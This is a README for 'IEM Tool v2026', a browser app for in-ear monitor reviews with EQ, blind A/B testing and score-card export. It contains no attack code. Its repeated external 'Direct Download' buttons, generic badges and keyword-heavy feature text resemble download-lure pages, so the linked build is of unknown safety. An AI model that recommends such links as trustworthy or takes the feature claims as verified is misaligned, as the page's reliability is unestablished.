# IEM Tool v2026 - audio review tool 2026

> **A browser-based workspace for IEM comparison, EQ-based sound shaping, and structured listening notes, designed for offline-friendly use in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonlabs1995/iem-review-tool-v2026?style=flat-square)](https://github.com/jasonlabs1995/iem-review-tool-v2026)

---

<p align="center">
  <a href="https://jasonlabs1995.github.io/iem-review-tool-v2026/">
    <img src="https://img.shields.io/badge/Download-IEM%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download IEM Tool">
  </a>
</p>

> **[Direct Download - IEM Tool v2026](https://jasonlabs1995.github.io/iem-review-tool-v2026/)**

---

[Download Latest Build](https://jasonlabs1995.github.io/iem-review-tool-v2026/)

---

## What is IEM Tool?

IEM Tool is a compact web application for in-ear monitor reviews, built around comparison, scoring, and listening analysis. It gives you a place to collect impressions, keep review records organized, and revisit earlier evaluations without relying on a full desktop suite.

It is aimed at enthusiasts, reviewers, and anyone who wants a repeatable way to judge IEM performance across different tracks and tuning styles. Because it is built for offline-oriented use with straightforward controls, the experience stays focused on the listening process rather than on setup overhead.

---

## Key Capabilities

- Rate and review IEMs with a straightforward scoring flow
- 10-band EQ for fast sound adjustments and tuning checks
- AutoEQ support for applying or comparing target-driven changes
- Similar IEM search to surface related models during evaluation
- Blind A/B testing for direct listening comparisons
- Hearing test tools for basic listening checks
- Burn-in timer for tracking extended listening sessions
- Export score cards, store notes, and compare results later
- Drag and drop file handling for quicker imports and a smoother workflow

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/jasonlabs1995/iem-review-tool-v2026.git
2. Open the project folder in your browser or host it with a simple static server.
3. If you are running locally, launch the main HTML file or serve the folder from your preferred web server.

Example local start:

- `python -m http.server 8000`

Then open:

- `http://localhost:8000`

---

## How to Use It

1. Add an IEM to review and write down your notes.
2. Use the EQ tools to compare tuning changes and target responses.
3. Run blind A/B tests when you want more neutral comparisons.
4. Search for similar IEMs to expand your reference set.
5. Use the hearing test and burn-in timer as part of your listening routine.
6. Save your results, compare sessions, and export score cards when needed.

Typical workflow:

- Load or drag in your files
- Pick the IEM you want to evaluate
- Adjust EQ or AutoEQ settings
- Compare candidates side by side
- Save your review for later reference

---

## Configuration

Most settings live inside the app interface and are saved with your session data or review records. If you host the project locally, configuration mostly comes down to how you serve the HTML files and where you store exported notes or score cards.

Example structure:

    settings/
    reviews/
    exports/

---

## Requirements

- A modern web browser
- Local storage support for saving reviews and comparison data
- Optional static file hosting for local use
- Enough disk space for exported score cards, notes, and related files

---

## FAQ

**How do I update the tool?**  
Get the latest build from the project link and replace your local files if you are running it manually.

**Does it work offline?**  
Yes. The tool is built with offline use in mind, so it does not require constant network access.

**Where are my reviews stored?**  
Saved data depends on your browser storage and on any export path you choose for score cards or notes.

**What should I do if the app does not open?**  
Make sure the files are being served correctly, then try another browser or refresh after clearing cached content.

**Can I change the audio comparison workflow?**  
Yes. The app includes review, comparison, EQ, and testing features that you can use in whichever order fits your process.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
